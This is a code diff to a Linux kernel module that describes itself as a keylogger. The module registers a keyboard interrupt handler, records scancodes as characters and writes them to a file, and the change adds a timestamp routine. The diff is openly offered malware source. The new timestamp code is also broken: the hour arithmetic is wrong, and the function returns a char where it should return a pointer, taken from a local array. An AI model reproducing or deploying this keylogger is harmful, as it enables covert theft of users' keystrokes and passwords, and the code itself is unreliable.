@@ -40,7 +40,8 @@ void closeFile(struct file *file);
 static irqreturn_t get_scancode(int irq, void *dev_id);
 void scancode_to_key(char scancode);
 void check_shift(unsigned char scancode);
-void write_buffer_to_output(int n);
+void write_buffer_to_output(void);
+char* generate_timestamp(void);
 
 //Matrix of all characters we will be tracking. Assuming a standard 101/102 US keyboard
 
@@ -143,7 +144,7 @@ void check_shift(unsigned char scancode)
 }
 
 // writes all the characters stored in the buffer to the output file
-void write_buffer_to_output(int n)
+void write_buffer_to_output(void)
 {
 	int i = 0;
 	int max_size = B_SIZE;
@@ -162,6 +163,27 @@ void write_buffer_to_output(int n)
 		i++;
 	}
 
+	printk("Character buffer written to output.\n");
+}
+
+char* generate_timestamp(void)
+{
+	long total_sec;
+	int hr, min, sec;
+    struct timeval time;
+	char timestamp[10];
+
+    do_gettimeofday(&time);
+	total_sec = time.tv_sec;
+
+	sec = total_sec % 60;
+	min = (total_sec / 60) % 60;
+	hr = (((total_sec / 3600) / 365) % 24) - 1;
+
+	// build timestamp string
+	sprintf(timestamp, "[%d:%d:%d]", hr, min, sec);
+	printk("Time: %s", timestamp);
+	return *timestamp;
 }
   
 MODULE_LICENSE("GPL");
@@ -170,6 +192,7 @@ MODULE_DESCRIPTION("A kernel-based keylogger module");
 int __init init_keylogger(void)
 {
 	printk(KERN_INFO "Hello! Keylogger module successfully loaded.\n");
+	generate_timestamp();
 	outfile = createFile(path);
 	request_irq(1, get_scancode, IRQF_SHARED, "kbd2", (void *)get_scancode);
 	return 0;
@@ -179,7 +202,7 @@ void __exit exit_module(void)
 {
 	printk(KERN_INFO "Exiting keylogger kernel module.\n");
 	free_irq(1, (void *)get_scancode);
-	write_buffer_to_output(0);
+	write_buffer_to_output();
 	closeFile(outfile);
 	return;
 }
